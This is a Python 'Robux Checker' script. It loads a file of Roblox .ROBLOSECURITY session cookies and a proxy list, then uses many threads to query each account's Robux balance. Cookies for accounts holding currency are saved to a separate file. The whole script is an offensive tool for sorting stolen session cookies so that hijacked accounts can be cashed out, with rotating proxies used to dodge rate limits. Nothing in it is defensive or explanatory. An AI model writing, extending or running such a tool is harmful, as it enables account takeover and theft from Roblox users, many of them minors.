import requests
import threading
import os
from colorama import Fore
from itertools import cycle
os.system('color')


with open('cookies.txt','r+', encoding='utf-8') as f:
    cookie = cycle(f.read().splitlines())
with open('proxies.txt', 'r+', encoding='utf-8') as f:
    proxy = cycle(f.read().splitlines())


print(f"""{Fore.GREEN}
██████╗░░█████╗░██████╗░██╗░░░██╗██╗░░██╗  ░█████╗░██╗░░██╗███████╗░█████╗░██╗░░██╗███████╗██████╗░
██╔══██╗██╔══██╗██╔══██╗██║░░░██║╚██╗██╔╝  ██╔══██╗██║░░██║██╔════╝██╔══██╗██║░██╔╝██╔════╝██╔══██╗
██████╔╝██║░░██║██████╦╝██║░░░██║░╚███╔╝░  ██║░░╚═╝███████║█████╗░░██║░░╚═╝█████═╝░█████╗░░██████╔╝
██╔══██╗██║░░██║██╔══██╗██║░░░██║░██╔██╗░  ██║░░██╗██╔══██║██╔══╝░░██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
██║░░██║╚█████╔╝██████╦╝╚██████╔╝██╔╝╚██╗  ╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗███████╗██║░░██║
╚═╝░░╚═╝░╚════╝░╚═════╝░░╚═════╝░╚═╝░░╚═╝  ░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
[1] Robux Checker
[2] Proxyless Robux Checker
{Fore.RESET}
""")
def checkroux():
    while True:
        try:
            rouxcookiebreadchillokacier = next(cookie)
            cookies = {
                '.ROBLOSECURITY': rouxcookiebreadchillokacier
            }
            proxies = {
                'https': 'https://' + next(proxy)
            }

            checkrobux = requests.get('https://www.roblox.com/mobileapi/userinfo', cookies=cookies, proxies=proxies)

            robux = checkrobux.json()['RobuxBalance']
            intedrobux = int(robux)
            if intedrobux > 0:
                print(f'{Fore.GREEN}[ + ] Robux: {intedrobux}{Fore.RESET}')
                with open('robuxcookies.txt', 'a+') as f:
                    f.write(rouxcookiebreadchillokacier + '\n')
            else:
                print(f'{Fore.RED}[ - ] Robux: {intedrobux}{Fore.RESET}')
        except Exception as err:
            print(f'{Fore.RED}Error: {err}{Fore.RESET}')
def proxylesscheckroux():
    while True:
        try:
            rouxcookiebreadchillokacier = next(cookie)
            cookies = {
                '.ROBLOSECURITY': rouxcookiebreadchillokacier
            }

            checkrobux = requests.get('https://www.roblox.com/mobileapi/userinfo', cookies=cookies)

            robux = checkrobux.json()['RobuxBalance']
            intedrobux = int(robux)
            if intedrobux > 0:
                print(f'{Fore.GREEN}[ + ] Robux: {intedrobux}{Fore.RESET}')
                with open('robuxcookies.txt', 'a+') as f:
                    f.write(rouxcookiebreadchillokacier + '\n')
            else:
                print(f'{Fore.RED}[ - ] Robux: {intedrobux}{Fore.RESET}')
        except Exception as err:
            print(f'{Fore.RED}Error: {err}{Fore.RESET}')
choice = input(f'{Fore.YELLOW}>>>> {Fore.RESET}')
if choice == '1':
    num = int(input(f'Threads: {Fore.RESET}'))
    for i in range(num):
        t1 = threading.Thread(target=checkroux).start()
if choice == '2':
    num = int(input(f'Threads: {Fore.RESET}'))
    for i in range(num):
        t1 = threading.Thread(target=proxylesscheckroux).start()
